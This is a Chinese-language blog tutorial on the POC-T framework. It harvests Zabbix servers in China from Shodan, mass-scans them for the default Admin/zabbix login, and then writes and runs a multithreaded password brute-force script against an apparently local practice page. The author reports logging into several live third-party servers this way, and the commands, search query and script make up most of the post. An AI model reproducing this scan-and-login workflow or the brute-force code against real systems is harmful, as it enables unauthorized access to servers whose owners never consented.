---
title: "POC-T框架使用之扫描zabbix弱密码"
categories: [ "安全技术","工具分享" ]
tags: [ "渗透工具","poc" ]
draft: false
slug: "493"
date: "2020-02-11 18:14:00"
---

## 框架使用

`python2.7`环境使用

```
git clone https://github.com/Xyntax/POC-T
pip install -r requirement.txt
python POC-T.py:查看参数
```

常用参数：

- -s:指定要使用`script`文件夹里面的哪个脚本
- -t:指定线程数
- -iS:指定单个目标，ip 或者域名都可以
- -iF:指定多个目标(文件)，我们今天就用到这个参数
- -aZ/aS/aG/aF:使用钟馗之眼/shodan/google 开发者/fofa 功能，使用这些需要先配置 toolkit.conf
- --limit:在使用上面这些搜索引擎搜索数据时限定需要的目标数量
- --update:更新 POC-T

## 解析 shodan 下载的数据

`shodan`搜索`Zabbix country:"CN"`获得`zabbix`数据，下载

`cmd`里安装`python`的`shodan`模块解析下载下来的数据

（当然你也可以在命令行使用 shodan 直接进行搜索和下载数据）

```
pip install shodan
shodan parse --fields ip_str,port,org --separator , shodan-export.json_2.gz
```

![][1]

```
shodan parse --fields ip_str,port --separator , shodan-export.json_2.gz > urls.txt
```

到处数据，打开`urls.txt`替换`,`为`:`

## POC-T 使用脚本批量扫描弱密码

```
python POC-T.py -s zabbix-weakpass -t 100 -iF urls.txt
```

![][2]

可以看到`4`年前的`69`个结果，目前还剩`5`个，使用弱密码`Admin/zabbix`登录

登上去发现都是空的了，不过没关系，只是抛砖引玉：

![][3]

## POC-T 使用自己写的脚本

可以参考官方脚本编写[教程][4]

> 编写自定义脚本，只需要声明一个函数作为接口，没有其他任何限制．从此告别文档，无需记忆函数名和模板调用，使效率最大化．

我这里以前几天写的文章`BruteForce_test 暴力破解练习`的`Level-1`为例子

安装`http`请求转换插件[`http-script-generator`][5]，请求右键

![][6]

转换为`python`的代码如下:

![][7]

没有放在`POC-T`框架里跑的效果如下：

![][8]

那根据`POC-T`脚本编写规则，脚本编写如下：

（最开始放在`POC-T`框架里跑不出来，后面想了下是 python2.7 没有 format 等函数以及中文字符解码的问题）

```
# coding=utf-8
import requests


def poc(dict):
    try:
        paramsPost = {"name": "admin", "password": dict}
        headers = {"Connection": "close"}
        response = requests.post(
            "http://192.168.1.11/BruteForc_test/Loginl.php", data=paramsPost, headers=headers)
        if u"登陆成功" in response.content.decode('utf8'):
            return "login success,password:" + dict
    except:
        return False
```

使用`top1000`[字典][9]，设置`10`进程破解：

```
python POC-T.py -s BruteForce_test -t 10 -iF top1000.txt
```

![][10]

还有一个小问题，如何成功之后立马退出而不是等待所有字典跑完，后面我知道了会更新在这里

现在你就拥有了一个多线程异步的框架，不用担心线程管理的等问题，而且它还有很多内置的[脚本库][11]

于是乎之前一直拖欠的`phpmyadmin`多线程爆破脚本也就迎刃而解了，我会更新到原文章里

参考文章：

- [Shodan API 使用指南][12]
- [zabbix 弱口令批量检测][13]
- [POC-T 使用][14]

本文完。

[1]: https://img.soapffz.com/archives_img/2020/02/11/archives_20200211_180904.png
[2]: https://img.soapffz.com/archives_img/2020/02/11/archives_20200211_182414.png
[3]: https://img.soapffz.com/archives_img/2020/02/11/archives_20200211_183608.png
[4]: https://github.com/Xyntax/POC-T/wiki/03-%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC
[5]: https://github.com/h3xstream/http-script-generator
[6]: https://img.soapffz.com/archives_img/2020/02/11/archives_20200211_185319.png
[7]: https://img.soapffz.com/archives_img/2020/02/11/archives_20200211_185408.png
[8]: https://img.soapffz.com/archives_img/2020/02/11/archives_20200211_192244.png
[9]: https://github.com/TheKingOfDuck/fuzzDicts/blob/master/passwordDict/top1000.txt
[10]: https://img.soapffz.com/archives_img/2020/02/11/archives_20200211_193248.png
[11]: https://github.com/Xyntax/POC-T/wiki/%E5%86%85%E7%BD%AE%E8%84%9A%E6%9C%AC%E5%BA%93
[12]: https://3gstudent.github.io/3gstudent.github.io/Shodan-API%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/
[13]: https://blog.csdn.net/cd_xuyue/article/details/51199851
[14]: http://yangge.me/2018/07/11/POC-T%E4%BD%BF%E7%94%A8/